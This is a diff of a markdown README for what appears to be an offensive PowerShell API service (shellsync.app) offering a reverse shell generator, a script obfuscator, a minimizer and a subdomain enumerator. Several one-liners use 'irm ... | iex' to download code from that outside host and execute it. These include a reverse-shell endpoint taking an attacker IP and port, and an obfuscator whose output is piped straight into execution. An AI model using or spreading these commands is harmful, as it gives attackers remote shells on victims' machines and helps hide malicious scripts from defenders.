@@ -11,7 +11,7 @@ Tools:
 # Reverse Shell Generator
 
 <details>
-  <summary>Click to expand!</summary>
+  <summary>Click to expand</summary>
 
 ```markdown
 Endpoint: `/api1/revshell`
@@ -85,22 +85,52 @@ $en=$(irm -Uri 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiK
 
 # PS Script Obfuscator
 
+<details>
+  <summary>Click to expand</summary>
+
+```markdown
+Endpoint: `/api1/obfuscate`
+```
+
 ### Basic Api call
 
 ```powershell
-irm -Uri 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}' -Method POST | iex
+irm -Uri 'https://shellsync.app/api1/obfuscate?u=website.com/file&key={$ApiKey}' -Method POST | iex
+```
+</details>
+
+# PS Script Minimizer
+
+<details>
+  <summary>Click to expand</summary>
+
+```markdown
+Endpoint: `/api1/mini`
 ```
 
+### Basic Api call
+
+```powershell
+irm -Uri 'https://shellsync.app/api1/mini?u=website.com/file' -Method POST
+```
+</details>
 
 # Enumerate Subdomains
+<details>
+  <summary>Click to expand!</summary>
+
+```markdown
+Endpoint: `/api1/enumsubdomain`
+```
+
 [WebApp Version](https://powershellforhackers.com/tools/subdomain/enumerator)
 
 ### Basic Api call
 
 ```powershell
-irm -Uri 'https://shellsync.app/api1/revshell?i={$IP}&p={$PORT}&key={$ApiKey}' -Method POST | iex
+irm -Uri 'https://shellsync.app/api1/enumsubdomain?u=website.com&key={$ApiKey}' -Method POST
 ```
-
+</details>
 
 
 
